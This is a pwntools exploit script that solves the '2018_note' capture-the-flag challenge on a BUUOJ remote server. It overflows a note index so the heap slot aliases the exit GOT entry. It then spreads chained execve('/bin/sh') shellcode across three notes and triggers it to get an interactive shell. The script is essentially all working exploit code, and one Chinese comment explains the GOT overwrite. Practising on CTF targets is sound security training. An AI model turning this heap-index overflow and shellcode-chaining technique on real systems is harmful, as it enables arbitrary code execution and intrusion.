#coding:utf8
from pwn import *

context(os='linux',arch='amd64', log_level='debug')
#sh = process('./2018_note')
sh = remote('node4.buuoj.cn',28356)

def add(index,size,content):
   sh.sendline('1')
   sleep(1)
   sh.sendline(str(index))
   sleep(1)
   sh.sendline(size)
   sleep(1)
   sh.sendline(content)


sh.recvuntil("#          404 not found")
#溢出覆盖index，使得heap[i]对应exit的got表，这样就能将exit的got表修改为一个heap地址
payload = b'13'.ljust(0xA,b'\x00') + p32(0xFFFFFFF8)
sc1 = asm('''mov rax,0x0068732f6e69622f
             jmp $+0x16
          ''')
add(0,payload,sc1)
sc2 = asm('''push rax
             xor rax,rax
             mov al,0x3B
             mov rdi,rsp
             jmp $+0x17
          ''')
add(1,'13',sc2)

sc3 = asm('''xor rsi,rsi
             xor rdx,rdx
             syscall
          ''')
add(2,'13',sc3)
#getshell
sh.sendline('5')

sh.interactive()